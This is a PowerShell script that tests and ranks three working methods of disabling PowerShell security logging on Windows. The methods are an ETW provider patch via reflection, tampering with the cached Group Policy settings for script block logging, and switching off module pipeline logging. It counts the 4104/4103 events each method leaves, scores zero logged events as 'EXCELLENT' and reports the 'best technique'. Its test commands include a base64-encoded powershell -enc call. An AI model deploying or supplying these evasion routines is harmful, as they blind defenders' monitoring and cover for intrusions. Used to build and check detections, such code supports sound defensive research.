function Test-EvasionTechnique {
    param(
        [string]$TechniqueName,
        [scriptblock]$EvasionCode,
        [scriptblock]$TestCommands
    )
    
    Write-Host "`n$("-" * 50)" -ForegroundColor Cyan
    Write-Host "TESTING: $TechniqueName" -ForegroundColor Cyan
    Write-Host "$("-" * 50)" -ForegroundColor Cyan
    
    # Count before
    $before_4104 = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} -ErrorAction SilentlyContinue | Measure-Object).Count
    $before_4103 = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4103} -ErrorAction SilentlyContinue | Measure-Object).Count
    
    Write-Host "Before - 4104: $before_4104, 4103: $before_4103" -ForegroundColor Gray
    
    # Apply evasion
    Write-Host "Applying $TechniqueName..." -ForegroundColor Yellow
    try {
        & $EvasionCode
        Write-Host "Evasion applied successfully" -ForegroundColor Green
        
        # Execute test commands
        Write-Host "Executing test commands..." -ForegroundColor Yellow
        & $TestCommands
        
        # Wait and measure
        Start-Sleep 3
        
        $after_4104 = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} -ErrorAction SilentlyContinue | Measure-Object).Count
        $after_4103 = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4103} -ErrorAction SilentlyContinue | Measure-Object).Count
        
        Write-Host "After - 4104: $after_4104, 4103: $after_4103" -ForegroundColor Gray
        
        $diff_4104 = $after_4104 - $before_4104
        $diff_4103 = $after_4103 - $before_4103
        $total_diff = $diff_4104 + $diff_4103
        
        Write-Host "NEW Events: 4104=$diff_4104, 4103=$diff_4103, Total=$total_diff" -ForegroundColor Gray
        
        # Determine status and color (single string with if-else)
        if ($total_diff -eq 0) {
            $statusText = "EXCELLENT"
            $fullDesc = "No events logged"
            $color = "Green"
        } elseif ($total_diff -le 2) {
            $statusText = "GOOD"
            $fullDesc = "Minimal events logged"
            $color = "Yellow"
        } elseif ($total_diff -le 5) {
            $statusText = "FAIR"
            $fullDesc = "Some events logged"
            $color = "Yellow"
        } else {
            $statusText = "POOR"
            $fullDesc = "Many events still logged"
            $color = "Red"
        }
        
        $fullStatus = "$statusText - $fullDesc"
        Write-Host "RESULT: $fullStatus" -ForegroundColor $color
        
        return @{
            Events = $total_diff
            Status = $statusText
        }
        
    } catch {
        Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
        return @{ Events = 999; Status = "ERROR" }
    }
}

# Test Commands (standard set for all techniques)
$standardTests = {
    whoami | Out-Null
    Get-Process | Select-Object -First 3 | Out-Null
    Write-Host "Test message"
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Get-Service"))
    powershell -enc $encoded | Out-Null
}

# Technique 1: PowerShell Reflection
$reflectionCode = {
    $logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
    [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0)
}

# Technique 2: GPO Cache Modification
$gpoCode = {
    $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
    $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
    $sbKey = "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    $sbDict = [Collections.Generic.Dictionary[String,Object]]::new()
    $sbDict.Add("EnableScriptBlockLogging", "0")
    $sbDict.Add("EnableScriptBlockInvocationLogging", "0")
    $GroupPolicySettings[$sbKey] = $sbDict
    Import-Module Microsoft.PowerShell.Utility -Force
}

# Technique 3: Pipeline Abuse
$pipelineCode = {
    $modules = Get-Module
    foreach ($module in $modules) {
        try { $module.LogPipelineExecutionDetails = $false } catch {}
    }
    $snapins = Get-PSSnapin
    foreach ($snapin in $snapins) {
        try { $snapin.LogPipelineExecutionDetails = $false } catch {}
    }
}

# Run comparison tests
Write-Host "ETW EVASION TECHNIQUE COMPARISON" -ForegroundColor Cyan
Write-Host "Testing each technique with identical commands`n" -ForegroundColor Gray

$results = @{}
$results['Reflection'] = Test-EvasionTechnique -TechniqueName "PowerShell Reflection" -EvasionCode $reflectionCode -TestCommands $standardTests
$results['GPO'] = Test-EvasionTechnique -TechniqueName "GPO Cache Modification" -EvasionCode $gpoCode -TestCommands $standardTests  
$results['Pipeline'] = Test-EvasionTechnique -TechniqueName "Pipeline Abuse" -EvasionCode $pipelineCode -TestCommands $standardTests

# Summary Table
Write-Host "`n$("=" * 50)" -ForegroundColor Cyan
Write-Host "COMPARISON SUMMARY" -ForegroundColor Cyan
Write-Host "$("=" * 50)" -ForegroundColor Cyan

# Sort by events (lowest first)
$sortedResults = $results.GetEnumerator() | Sort-Object { $_.Value.Events }

# Print table header (separate lines for color)
Write-Host "Technique            Events     Status" -ForegroundColor Cyan
Write-Host "--------             ------     ------" -ForegroundColor Gray

foreach ($result in $sortedResults) {
    $events = $result.Value.Events
    $status = $result.Value.Status
    $color = switch ($events) {
        0 { "Green" }
        {$_ -le 2} { "Yellow" }
        {$_ -le 5} { "Yellow" }
        default { "Red" }
    }
    Write-Host "$($result.Key.PadRight(20)) $($events.ToString().PadRight(10)) $status" -ForegroundColor $color
}

Write-Host "$("=" * 50)" -ForegroundColor Cyan
Write-Host "Best technique: $($sortedResults[0].Key) ($($sortedResults[0].Value.Events) events)" -ForegroundColor Green